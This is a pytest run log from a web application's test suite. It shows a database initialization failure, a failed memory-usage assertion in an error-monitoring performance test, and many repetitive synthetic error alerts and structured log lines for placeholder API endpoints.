WARNING  app.core.logging:database.py:89 [2m2025-07-05T14:23:43.536879Z[0m [[33m[1mwarning  [0m] [1mDatabase initialization attempt 3 failed: 'coroutine' object does not support the asynchronous context manager protocol[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m89[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
ERROR    app.core.logging:database.py:93 [2m2025-07-05T14:23:43.537066Z[0m [[31m[1merror    [0m] [1mFailed to initialize database service after 3 attempts[0m [[0m[1m[34mapp.core.logging[0m][0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35mdatabase.py[0m [36mfunc_name[0m=[35minitialize[0m [36mlineno[0m=[35m93[0m [36mmodule[0m=[35mdatabase[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/services/database.py[0m
______________ TestMemoryUsage.test_error_monitoring_memory_usage ______________
tests/performance/test_performance.py:536: in test_error_monitoring_memory_usage
    assert memory_per_error < 512  # Less than 512 bytes per error
E   assert 1730.1504 < 512
----------------------------- Captured stdout call -----------------------------

🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_0
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_0, /api/endpoint_50
Status Codes: 400, 450, 500, 550
First Occurrence: 2025-07-05T15:23:43.683255
Last Occurrence: 2025-07-05T15:23:43.954188


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_1
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_1, /api/endpoint_51
Status Codes: 401, 451, 501, 551
First Occurrence: 2025-07-05T15:23:43.683427
Last Occurrence: 2025-07-05T15:23:43.954396


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_2
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_2, /api/endpoint_52
Status Codes: 552, 402, 452, 502
First Occurrence: 2025-07-05T15:23:43.683498
Last Occurrence: 2025-07-05T15:23:43.954550


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_3
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_3, /api/endpoint_53
Status Codes: 553, 403, 453, 503
First Occurrence: 2025-07-05T15:23:43.683556
Last Occurrence: 2025-07-05T15:23:43.954696


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_4
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_4, /api/endpoint_54
Status Codes: 504, 554, 404, 454
First Occurrence: 2025-07-05T15:23:43.683611
Last Occurrence: 2025-07-05T15:23:43.954848


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_5
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_5, /api/endpoint_55
Status Codes: 505, 555, 405, 455
First Occurrence: 2025-07-05T15:23:43.683665
Last Occurrence: 2025-07-05T15:23:43.954995


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_6
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_6, /api/endpoint_56
Status Codes: 456, 506, 556, 406
First Occurrence: 2025-07-05T15:23:43.683725
Last Occurrence: 2025-07-05T15:23:43.955155


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_7
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_7, /api/endpoint_57
Status Codes: 457, 507, 557, 407
First Occurrence: 2025-07-05T15:23:43.683780
Last Occurrence: 2025-07-05T15:23:43.955375


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_8
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_8, /api/endpoint_58
Status Codes: 408, 458, 508, 558
First Occurrence: 2025-07-05T15:23:43.683834
Last Occurrence: 2025-07-05T15:23:43.955528


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_9
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_9, /api/endpoint_59
Status Codes: 409, 459, 509, 559
First Occurrence: 2025-07-05T15:23:43.683887
Last Occurrence: 2025-07-05T15:23:43.955681


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_10
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_10, /api/endpoint_60
Status Codes: 560, 410, 460, 510
First Occurrence: 2025-07-05T15:23:43.683940
Last Occurrence: 2025-07-05T15:23:43.955824


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_11
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_11, /api/endpoint_61
Status Codes: 561, 411, 461, 511
First Occurrence: 2025-07-05T15:23:43.683993
Last Occurrence: 2025-07-05T15:23:43.956040


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_12
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_12, /api/endpoint_62
Status Codes: 512, 562, 412, 462
First Occurrence: 2025-07-05T15:23:43.684045
Last Occurrence: 2025-07-05T15:23:43.956202


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_13
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_13, /api/endpoint_63
Status Codes: 513, 563, 413, 463
First Occurrence: 2025-07-05T15:23:43.684098
Last Occurrence: 2025-07-05T15:23:43.956351


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_14
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_14, /api/endpoint_64
Status Codes: 464, 514, 564, 414
First Occurrence: 2025-07-05T15:23:43.684149
Last Occurrence: 2025-07-05T15:23:43.956495


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_15
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_15, /api/endpoint_65
Status Codes: 465, 515, 565, 415
First Occurrence: 2025-07-05T15:23:43.684199
Last Occurrence: 2025-07-05T15:23:43.956646


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_16
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_16, /api/endpoint_66
Status Codes: 416, 466, 516, 566
First Occurrence: 2025-07-05T15:23:43.684249
Last Occurrence: 2025-07-05T15:23:43.956789


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_17
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_17, /api/endpoint_67
Status Codes: 417, 467, 517, 567
First Occurrence: 2025-07-05T15:23:43.684299
Last Occurrence: 2025-07-05T15:23:43.956937


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_18
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_18, /api/endpoint_68
Status Codes: 568, 418, 468, 518
First Occurrence: 2025-07-05T15:23:43.684352
Last Occurrence: 2025-07-05T15:23:43.957158


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_19
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_19, /api/endpoint_69
Status Codes: 569, 419, 469, 519
First Occurrence: 2025-07-05T15:23:43.684403
Last Occurrence: 2025-07-05T15:23:43.957315


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_20
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_20, /api/endpoint_70
Status Codes: 520, 570, 420, 470
First Occurrence: 2025-07-05T15:23:43.684453
Last Occurrence: 2025-07-05T15:23:43.957463


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_21
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_21, /api/endpoint_71
Status Codes: 521, 571, 421, 471
First Occurrence: 2025-07-05T15:23:43.684501
Last Occurrence: 2025-07-05T15:23:43.957614


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_22
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_22, /api/endpoint_72
Status Codes: 472, 522, 572, 422
First Occurrence: 2025-07-05T15:23:43.684551
Last Occurrence: 2025-07-05T15:23:43.957764


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_23
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_23, /api/endpoint_73
Status Codes: 473, 523, 573, 423
First Occurrence: 2025-07-05T15:23:43.684602
Last Occurrence: 2025-07-05T15:23:43.957913


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_24
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_24, /api/endpoint_74
Status Codes: 424, 474, 524, 574
First Occurrence: 2025-07-05T15:23:43.684652
Last Occurrence: 2025-07-05T15:23:43.958058


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_25
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_25, /api/endpoint_75
Status Codes: 425, 475, 525, 575
First Occurrence: 2025-07-05T15:23:43.684701
Last Occurrence: 2025-07-05T15:23:43.958203


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_26
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_26, /api/endpoint_76
Status Codes: 576, 426, 476, 526
First Occurrence: 2025-07-05T15:23:43.684751
Last Occurrence: 2025-07-05T15:23:43.958450


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_27
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_27, /api/endpoint_77
Status Codes: 577, 427, 477, 527
First Occurrence: 2025-07-05T15:23:43.684801
Last Occurrence: 2025-07-05T15:23:43.958607


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_28
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_28, /api/endpoint_78
Status Codes: 528, 578, 428, 478
First Occurrence: 2025-07-05T15:23:43.684850
Last Occurrence: 2025-07-05T15:23:43.958755


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_29
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_29, /api/endpoint_79
Status Codes: 529, 579, 429, 479
First Occurrence: 2025-07-05T15:23:43.684941
Last Occurrence: 2025-07-05T15:23:43.958974


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_30
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_30, /api/endpoint_80
Status Codes: 480, 530, 580, 430
First Occurrence: 2025-07-05T15:23:43.685022
Last Occurrence: 2025-07-05T15:23:43.959140


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_31
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_31, /api/endpoint_81
Status Codes: 481, 531, 581, 431
First Occurrence: 2025-07-05T15:23:43.685082
Last Occurrence: 2025-07-05T15:23:43.959296


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_32
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_32, /api/endpoint_82
Status Codes: 432, 482, 532, 582
First Occurrence: 2025-07-05T15:23:43.685136
Last Occurrence: 2025-07-05T15:23:43.959444


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_33
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_33, /api/endpoint_83
Status Codes: 433, 483, 533, 583
First Occurrence: 2025-07-05T15:23:43.685188
Last Occurrence: 2025-07-05T15:23:43.959590


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_34
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_34, /api/endpoint_84
Status Codes: 584, 434, 484, 534
First Occurrence: 2025-07-05T15:23:43.685239
Last Occurrence: 2025-07-05T15:23:43.959735


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_35
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_35, /api/endpoint_85
Status Codes: 585, 435, 485, 535
First Occurrence: 2025-07-05T15:23:43.685289
Last Occurrence: 2025-07-05T15:23:43.959889


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_36
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_36, /api/endpoint_86
Status Codes: 536, 586, 436, 486
First Occurrence: 2025-07-05T15:23:43.685339
Last Occurrence: 2025-07-05T15:23:43.960108


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_37
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_37, /api/endpoint_87
Status Codes: 537, 587, 437, 487
First Occurrence: 2025-07-05T15:23:43.685391
Last Occurrence: 2025-07-05T15:23:43.960270


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_38
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_38, /api/endpoint_88
Status Codes: 488, 538, 588, 438
First Occurrence: 2025-07-05T15:23:43.685441
Last Occurrence: 2025-07-05T15:23:43.960419


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_39
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_39, /api/endpoint_89
Status Codes: 489, 539, 589, 439
First Occurrence: 2025-07-05T15:23:43.685491
Last Occurrence: 2025-07-05T15:23:43.960566


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_40
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_40, /api/endpoint_90
Status Codes: 440, 490, 540, 590
First Occurrence: 2025-07-05T15:23:43.685540
Last Occurrence: 2025-07-05T15:23:43.960774


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_41
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_41, /api/endpoint_91
Status Codes: 441, 491, 541, 591
First Occurrence: 2025-07-05T15:23:43.685590
Last Occurrence: 2025-07-05T15:23:43.960950


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_42
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_42, /api/endpoint_92
Status Codes: 592, 442, 492, 542
First Occurrence: 2025-07-05T15:23:43.685644
Last Occurrence: 2025-07-05T15:23:43.961108


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_43
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_43, /api/endpoint_93
Status Codes: 593, 443, 493, 543
First Occurrence: 2025-07-05T15:23:43.685698
Last Occurrence: 2025-07-05T15:23:43.961262


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_44
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_44, /api/endpoint_94
Status Codes: 544, 594, 444, 494
First Occurrence: 2025-07-05T15:23:43.685750
Last Occurrence: 2025-07-05T15:23:43.961412


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_45
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_45, /api/endpoint_95
Status Codes: 545, 595, 445, 495
First Occurrence: 2025-07-05T15:23:43.685801
Last Occurrence: 2025-07-05T15:23:43.961560


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_46
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_46, /api/endpoint_96
Status Codes: 496, 546, 596, 446
First Occurrence: 2025-07-05T15:23:43.685851
Last Occurrence: 2025-07-05T15:23:43.961704


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_47
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_47, /api/endpoint_97
Status Codes: 497, 547, 597, 447
First Occurrence: 2025-07-05T15:23:43.685906
Last Occurrence: 2025-07-05T15:23:43.961852


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_48
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_48, /api/endpoint_98
Status Codes: 448, 498, 548, 598
First Occurrence: 2025-07-05T15:23:43.685956
Last Occurrence: 2025-07-05T15:23:43.962001


🚨 ERROR ALERT 🚨
ALERT: High error rate detected
Error Type: error_type_49
Count: 100 errors in 60 minutes
Affected Paths: /api/endpoint_49, /api/endpoint_99
Status Codes: 449, 499, 549, 599
First Occurrence: 2025-07-05T15:23:43.686006
Last Occurrence: 2025-07-05T15:23:43.962145

------------------------------ Captured log call -------------------------------
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683282Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 0'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683438Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683505Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683563Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683618Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683673Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 5'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683732Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 6'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683787Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 7'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683840Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 8'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683893Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 9'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683946Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 10'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.683999Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 11'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684051Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 12'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684103Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 13'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684154Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 14'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684205Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 15'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684254Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 16'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.684305Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m1[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 17'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
